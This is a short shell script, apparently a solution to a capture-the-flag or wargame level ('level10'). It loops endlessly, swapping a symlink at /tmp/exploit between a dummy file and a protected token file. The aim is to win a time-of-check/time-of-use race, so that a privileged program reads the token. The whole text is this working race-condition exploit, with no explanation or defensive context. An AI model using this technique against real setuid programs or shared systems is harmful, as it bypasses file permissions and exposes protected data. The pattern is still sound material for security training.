touch /tmp/fake
while true; do
    ln -sf /tmp/fake /tmp/exploit
    ln -sf /home/user/level10/token /tmp/exploit
done
